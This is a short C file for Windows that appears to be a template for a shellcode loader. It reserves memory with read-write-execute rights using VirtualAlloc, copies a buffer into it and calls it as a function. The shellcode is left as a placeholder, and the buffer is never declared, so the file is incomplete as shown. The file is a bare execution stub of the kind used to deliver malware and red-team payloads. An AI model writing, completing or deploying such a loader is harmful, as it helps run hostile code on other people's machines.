#include <windows.h>

int main() {
    // Shellcode goes here
    <shell_code>

    LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, buf, sizeof(buf));
    ((void(*)())Memory)();

    return 0;
}
